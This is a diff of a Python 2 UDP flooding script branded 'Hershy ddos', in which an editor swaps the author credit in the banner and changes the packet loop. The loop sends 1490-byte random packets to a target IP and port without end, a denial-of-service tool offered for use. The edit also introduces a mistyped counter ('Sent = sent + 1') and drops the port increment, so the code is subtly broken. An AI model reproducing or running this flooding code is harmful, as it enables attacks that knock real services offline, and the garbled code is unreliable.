@@ -18,8 +18,8 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet hershy ddos")
-print ".      (edit by kaksaro)"
+os.system("figlet kak.saro")
+print ".      (Hershy ddos)"
 print
 print "Author   : HA-MRX"
 print "You Tube : https://www.youtube.com/c/HA-MRX"
@@ -45,7 +45,7 @@ sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      nardny = nardny + 1
-     port = port + 1
+     Sent = sent + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
